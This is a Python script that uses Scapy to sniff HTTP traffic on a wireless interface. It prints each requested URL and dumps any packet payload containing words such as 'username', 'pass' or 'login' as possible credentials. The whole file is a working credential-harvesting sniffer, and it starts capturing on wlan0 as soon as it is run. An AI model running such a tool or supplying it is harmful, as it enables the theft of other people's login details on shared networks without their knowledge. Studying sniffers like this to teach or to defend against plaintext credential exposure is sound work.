#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    """
    Initiates packet sniffing on a specified network interface using Scapy.
    Captures packets in real-time and processes them with a callback function.

    Args:
        interface (str): The name of the network interface to sniff on (e.g., 'eth0', 'wlan0').
    """
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    """
    Extracts the URL from the HTTP request in the packet.

    Args:
        packet: The packet object captured by Scapy's sniff function.

    Returns:
        str: The full URL if HTTPRequest layer is present, otherwise an empty string.
    """
    if packet.haslayer(http.HTTPRequest):
        return f"{packet[http.HTTPRequest].Host.decode()}{packet[http.HTTPRequest].Path.decode()}"
    return ''

def get_credentials(packet):
    """
    Searches for possible credentials within the packet's raw load.

    Args:
        packet: The packet object captured by Scapy's sniff function.

    Returns:
        str: A string containing possible credentials if found, otherwise an empty string.
    """
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode(errors='ignore')
        keywords = ["uname", "pass", "username", "password", "login"]
        for keyword in keywords:
            if keyword in load:
                return f"Possible credentials: {load}"
    return ''

def process_sniffed_packet(packet):
    """
    Processes each packet captured by the sniffer. Extracts and prints the URL and
    any potential credentials found within the packet's payload.

    Args:
        packet: The packet object captured by Scapy's sniff function.
    """
    url = get_url(packet)
    if url:
        print(f"\n\n[*] HTTP Request URL: {url}\n\n")

    credentials = get_credentials(packet)
    if credentials:
        print(f"\n\n[*] {credentials}\n\n")

# Start packet sniffing on the 'wlan0' network interface.
sniff("wlan0")
